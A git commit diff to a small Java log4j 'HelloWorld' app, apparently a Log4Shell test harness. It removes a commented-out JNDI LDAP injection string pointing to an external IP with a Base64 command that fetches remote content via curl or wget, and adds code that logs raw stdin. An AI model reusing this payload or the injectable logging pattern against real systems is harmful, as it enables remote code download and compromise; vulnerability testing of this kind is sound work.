d983734f83b3edc069eb4b555d02f1d1f0ec273d
Christoffer Kugg Jerkeby <kugghjul@gmail.com>
2021-12-13 18:49:47 +0100

    Made the app read from stdin and print in the logger.

--- my-app/src/main/java/com/mkyong/HelloWorld.java
+++ my-app/src/main/java/com/mkyong/HelloWorld.java
@@ -1,5 +1,6 @@
 package com.mkyong;
 
+import java.util.Scanner;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -18,10 +19,9 @@ public class HelloWorld {
         
 	System.out.println("This is before from println");
         logger.info("This is before from log4j");
-        //logger.info("${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xOTIuMTY1LjI0NC4xNDM6NDQzfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE5Mi4xNjUuMjQ0LjE0Mzo0NDMpfGVjaG8=}");
+	Scanner sc = new Scanner(System.in);
+	while(sc.hasNextLine()) logger.info(sc.nextLine());
         logger.info("This is after from log4j");
         System.out.println("This is after from println");
-
     }
-
 }
